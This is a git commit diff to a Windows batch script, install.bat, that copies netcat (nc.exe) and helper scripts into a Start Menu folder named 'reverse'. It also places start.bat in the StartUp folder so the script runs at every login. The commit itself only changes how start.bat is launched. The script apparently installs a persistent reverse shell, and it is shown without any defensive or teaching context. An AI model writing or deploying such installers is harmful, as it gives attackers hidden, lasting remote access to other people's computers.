ca69e3c8df0fce001f4cb8c38f1a9d522ebb6337
strongpapazola <48545591+strongpapazola@users.noreply.github.com>
2020-07-13 02:34:31 +0700

    Update install.bat

--- install.bat
+++ install.bat
@@ -4,5 +4,5 @@ copy "%x%\1.vbs" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse\"
 copy "%x%\2.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse\"
 copy "%x%\nc.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\reverse\"
 copy "%x%\start.bat" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
-start "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\start.bat"
+"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\start.bat"
 pause
